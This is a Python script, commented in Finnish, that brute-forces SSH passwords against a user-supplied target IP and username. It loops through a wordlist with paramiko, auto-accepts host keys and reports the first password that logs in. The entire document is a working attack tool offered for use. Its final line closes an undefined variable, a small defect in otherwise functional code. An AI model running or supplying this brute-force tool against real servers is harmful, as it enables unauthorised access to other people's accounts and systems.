import paramiko  # Paramiko-kirjasto tarjoaa SSH-toiminnallisuuden
import sys
import os

# Pyydetään käyttäjältä SSH-palvelimen IP-osoitetta, käyttäjänimeä ja salasanatiedoston polkua
target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

# Funktio, joka yrittää muodostaa yhteyden SSH-palvelimeen annetulla salasanalla
def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()  # Luodaan SSHClient-olio
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Hyväksytään automaattisesti uusi isäntäavain

    try:
        # Yritetään muodostaa yhteys määritettyyn IP-osoitteeseen, käyttäjänimellä ja salasanalla
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        # Jos autentikointi epäonnistuu, asetetaan koodiksi 1
        code = 1
    ssh.close()  # Suljetaan yhteys
    return code  # Palautetaan vastauskoodi

# Avataan salasanatiedosto ja käydään läpi jokainen rivi (salasana)
with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()  # Poistetaan ylimääräiset merkit rivin alusta ja lopusta
        
        try:
            response = ssh_connect(password)  # Kutsutaan ssh_connect-funktiota kullakin salasanalla

            if response == 0:
                print('password found: '+ password)  # Salasana löytyi
                exit(0)
            elif response == 1: 
                print('no luck')  # Salasana ei toiminut
        except Exception as e:
            print(e)  # Tulostetaan mahdollinen virhe
        pass

# Suljetaan tiedosto
input_file.close()
